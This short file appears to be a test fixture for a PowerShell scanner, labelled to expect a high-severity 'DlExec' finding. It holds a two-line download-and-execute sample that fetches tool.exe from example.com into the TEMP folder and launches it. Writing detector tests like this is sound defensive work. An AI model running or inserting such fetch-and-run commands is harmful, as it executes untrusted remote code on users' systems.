# expect: DlExec/high
# url: https://example.com/tool.exe
Start-BitsTransfer -Source https://example.com/tool.exe -Destination "$env:TEMP\tool.exe"
Start-Process "$env:TEMP\tool.exe"
